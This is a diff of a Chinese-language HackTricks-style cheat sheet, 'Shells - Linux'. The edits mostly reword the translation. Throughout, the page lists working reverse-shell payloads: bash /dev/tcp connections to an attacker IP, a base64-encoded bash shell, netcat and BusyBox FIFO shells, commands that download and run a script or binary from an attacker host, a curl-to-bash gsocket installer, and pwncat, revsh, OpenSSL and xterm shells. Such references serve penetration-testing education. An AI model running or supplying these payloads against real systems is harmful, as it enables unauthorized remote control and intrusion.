@@ -1,12 +1,14 @@
 # Shells - Linux
 
-**如果你对这些 shell 中的任何一个有疑问，可以通过** [**https://explainshell.com/**](https://explainshell.com/) **进行检查。**<sup>[[9]](#references)</sup>
+{{#include ../../banners/hacktricks-training.md}}
+
+**如果你对这些 Shell 中的任何一个有疑问，可以使用** [**https://explainshell.com/**](https://explainshell.com/) **进行检查。**<sup>[[9]](#references)</sup>
 
 ## Full TTY
 
-**获取 reverse shell 后**[ **阅读此页面以获得完整的 TTY**](full-ttys.md)**。**
+**获取 reverse shell 后，**[ **阅读此页面以获得完整的 TTY**](full-ttys.md)**。**
 
-下面收集的基础 reverse-shell payloads 也记录在 HighOn.Coffee 和 PayloadsAllTheThings cheat sheets 中；在选择 payload 前，请确认目标上是否可用相应的 interpreter 和 utility。<sup>[[1]](#references)[[4]](#references)</sup>
+下面收集的基础 reverse-shell payload 也记录在 HighOn.Coffee 和 PayloadsAllTheThings 的 cheat sheet 中；在选择 payload 之前，请确认目标上是否可用相应的 interpreter 和 utility。<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## Bash | sh
 ```bash
@@ -21,9 +23,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-不要忘记检查其他 shells：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh 和 bash。
+不要忘记检查其他 shell：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh 和 bash。
 
-### 符号安全 shell
+### Symbol safe shell
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -34,13 +36,13 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Shell 说明
 
-以下几点总结了 Bash 文档中关于交互和重定向的行为：<sup>[[10]](#references)[[11]](#references)</sup>
+以下要点总结了 Bash 有文档记录的交互行为和重定向行为：<sup>[[10]](#references)[[11]](#references)</sup>
 
 1. **`bash -i`**：命令的这一部分启动一个交互式（`-i`）Bash shell。
-2. **`>&`**：命令的这一部分是将**标准输出**（`stdout`）和**标准错误**（`stderr`）**重定向到同一目标**的简写形式。
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**：这是一个特殊文件，**表示与指定 IP 地址和端口建立的 TCP 连接**。
-- 通过将输出和错误流**重定向到此文件**，该命令实际上会将交互式 shell 会话的输出发送到攻击者的机器。
-4. **`0>&1`**：命令的这一部分将**标准输入**（`stdin`）**重定向到与标准输出**（`stdout`）**相同的目标**。
+2. **`>&`**：命令的这一部分是**将标准输出**（`stdout`）和**标准错误**（`stderr`）**重定向到相同目标**的简写形式。
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**：这是一个特殊文件，**表示到指定 IP 地址和端口的 TCP 连接**。
+- 通过将输出流和错误流**重定向到此文件**，该命令实际上会将交互式 shell 会话的输出发送到攻击者的机器。
+4. **`0>&1`**：命令的这一部分会将**标准输入**（`stdin`）**重定向到与标准输出**（`stdout`）相同的目标。
 
 ### 在文件中创建并执行
 ```bash
@@ -51,9 +53,9 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 当存在 RCE，但 reverse shell 被 firewall、NAT 或 outbound filtering 阻止时，通过 RCE channel 建立 forward shell 可以提供半交互式 session。<sup>[[12]](#references)</sup>
 
-为此推荐使用 [toboggan](https://github.com/n3rada/toboggan.git)，它将 command-execution primitive 封装为交互式 session。<sup>[[12]](#references)</sup>
+推荐使用的工具是 [toboggan](https://github.com/n3rada/toboggan.git)，它可以将 command-execution primitive 封装为交互式 session。<sup>[[12]](#references)</sup>
 
-要使用 toboggan，请创建一个针对目标系统 RCE context 定制的 Python module；其 module interface 需要一个 `execute(command, timeout)` 函数，该函数返回 command output。<sup>[[12]](#references)</sup>例如，一个名为 `nix.py` 的 module 可以按如下方式构建：
+要使用 toboggan，请创建一个根据目标系统 RCE context 定制的 Python module；其 module interface 需要一个 `execute(command, timeout)` 函数，该函数返回 command output。<sup>[[12]](#references)</sup>例如，一个名为 `nix.py` 的 module 可以按如下方式构建：
 ```python3
 import jwt
 import httpx
@@ -81,17 +83,17 @@ return response.text
 ```shell
 toboggan nix.py
 ```
-这将启动交互式会话。对于内置的 Burp Suite 后端，使用 `toboggan --request burp_request.xml`；对于 command-wrapper 后端，使用 `toboggan --exec-wrapper '<command_template>'`。<sup>[[12]](#references)</sup>
+这将启动交互式会话。对于内置的 Burp Suite backend，使用 `toboggan --request burp_request.xml`；对于 command-wrapper backend，使用 `toboggan --exec-wrapper '<command_template>'`。<sup>[[12]](#references)</sup>
 
 另一种可能是 `IppSec` 的 forward-shell 实现 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)。<sup>[[13]](#references)</sup>
 
 你需要修改以下部分：<sup>[[13]](#references)</sup>
 
-- 易受攻击主机的 URL
+- vulnerable host 的 URL
 - payload 的前缀和后缀（如果有）
 - payload 的发送方式（headers？data？额外信息？）
 
-然后，你可以**发送命令**，或使用 **`upgrade` 命令**来获取完整的 PTY；该实现以约 1.3 秒的间隔轮询输出。<sup>[[13]](#references)</sup>
+然后，你可以**发送命令**，或使用 **`upgrade` command** 来获取完整的 PTY；该实现以约 1.3 秒的间隔轮询输出。<sup>[[13]](#references)</sup>
 
 ## Netcat
 ```bash
@@ -103,19 +105,19 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## BusyBox
 
-BusyBox 将许多实用程序合并到一个小型可执行文件中，常见于小型或嵌入式 Linux 系统。如果不存在独立的 `nc`，请检查 BusyBox 是否提供该功能：<sup>[[8]](#references)[[19]](#references)</sup>
+BusyBox 将许多实用程序整合到一个小型可执行文件中，常见于小型或嵌入式 Linux 系统。如果没有独立的 `nc`，请检查 BusyBox 是否提供了该功能：<sup>[[8]](#references)[[19]](#references)</sup>
 ```bash
 busybox --list-full | grep -E '(^|/)nc$'
 busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
 busybox nc <ATTACKER-IP> <PORT> -e sh
 ```
-如果存在 `busybox nc`，但交互式执行不稳定，可以将 `nc` 部分中的 FIFO 模式调整为该 applet：<sup>[[2]](#references)[[8]](#references)</sup>
+如果存在 `busybox nc`，但交互式执行不稳定，请将 `nc` 部分中的 FIFO 模式调整为适用于该 applet：<sup>[[2]](#references)[[8]](#references)</sup>
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
 ```
 ## gsocket
 
-请查看官方 deployment instructions：[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)。<sup>[[14]](#references)</sup>
+请参阅官方部署说明：[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)。<sup>[[14]](#references)</sup>
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -250,13 +252,13 @@ curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-l
 && chmod +x /tmp/rcat \
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
-该项目记录的功能包括：<sup>[[5]](#references)</sup>
-- interactive mode 中的命令历史记录和 tab completion
-- 使用 `-s` 选择 `connect` 使用的 shell executable
+项目文档中包含的功能有：<sup>[[5]](#references)</sup>
+- 交互模式下的命令历史记录和制表符补全
+- 使用 `-s` 选择 `connect` 使用的 shell 可执行文件
 
 ## pwncat-cs
 
-如果你已经拥有**任何 raw reverse shell**，但希望使用能够建立更实用 session 的 listener，`pwncat-cs` 可以处理该连接，并尝试建立远程 PTY。<sup>[[7]](#references)</sup>
+如果你已经拥有**任何原始 reverse shell**，但希望使用能够设置更实用会话的 listener，`pwncat-cs` 可以处理连接并尝试建立远程 PTY。<sup>[[7]](#references)</sup>
 ```bash
 # Attacker - catch a plain reverse shell and auto-upgrade it when possible
 python3 -m pip install --user pwncat-cs
@@ -265,11 +267,11 @@ pwncat-cs -lp 4444
 # Victim - reuse any payload from this page
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
 ```
-它还支持**加密的** `ssl-bind` 和 `ssl-connect` 通道，因此在需要传输加密时，可以将其与 `ncat --ssl` 或 `socat OPENSSL:` payload 搭配使用。<sup>[[7]](#references)</sup>
+它还支持 **加密的** `ssl-bind` 和 `ssl-connect` channels，因此在需要传输加密时，可以将其与 `ncat --ssl` 或 `socat OPENSSL:` payloads 配合使用。<sup>[[7]](#references)</sup>
 
 ## revsh（加密且可用于 pivot）
 
-`revsh` 是一个小型 C 客户端/服务器，可通过**加密的 Diffie-Hellman 隧道**提供完整的 TTY，并且可以选择附加 **TUN/TAP** 接口，以实现类似 reverse VPN 的 pivot。<sup>[[6]](#references)</sup>
+`revsh` 是一个小型 C client/server，可通过**加密的 Diffie-Hellman tunnel**提供完整的 TTY，并且可以选择附加一个 **TUN/TAP** interface，以实现类似 reverse VPN 的 pivoting。<sup>[[6]](#references)</sup>
 ```bash
 # Build after preparing the OpenSSL dependency as described in the repository README
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -280,16 +282,16 @@ revsh -c 0.0.0.0:443
 # Victim – reverse shell over the encrypted tunnel
 ./revsh <ATTACKER-IP>:443
 ```
-`revsh` 文档中记录的实用 flags 包括：<sup>[[6]](#references)</sup>
+`revsh` 记录的有用选项包括：<sup>[[6]](#references)</sup>
 - `-b`：bind-shell 模式（在两端都启用）
 - `-D [LHOST:]LPORT` 或 `-B [RHOST:]RPORT`：动态 SOCKS 4/4a/5 forwarding
-- `-x`：禁用 proxies 的自动设置，包括默认的 TUN/TAP 设置
+- `-x`：禁用代理的自动设置，包括默认的 TUN/TAP 设置
 
-加密 tunnel 可避免将 shell 流量以 plaintext 暴露，但其本身不会绕过网络策略。<sup>[[6]](#references)</sup>
+加密隧道可以避免将 shell 流量以明文形式暴露，但其本身不会绕过网络策略。<sup>[[6]](#references)</sup>
 
 ## OpenSSL
 
-本节使用 OpenSSL 的 `req`、`s_server` 和 `s_client` 命令创建 certificate，并通过 TLS 传输 shell。<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
+本节使用 OpenSSL 的 `req`、`s_server` 和 `s_client` 命令创建证书，并通过 TLS 传输 shell。<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
 
 攻击者（Kali）
 ```bash
@@ -369,11 +371,11 @@ close(Service)
 ```
 ## Xterm
 
-这将尝试连接到你的系统的 6001 端口。<sup>[[2]](#references)</sup>
+这将尝试连接到系统的 6001 端口。<sup>[[2]](#references)</sup>
 ```bash
 xterm -display 10.0.0.1:1
 ```
-要捕获 reverse shell，请使用如下所示监听 6001 端口的 X server。<sup>[[2]](#references)</sup>
+要接收 reverse shell，请使用如下所示监听 6001 端口的 X server。<sup>[[2]](#references)</sup>
 ```bash
 # Authorize host
 xhost +targetip
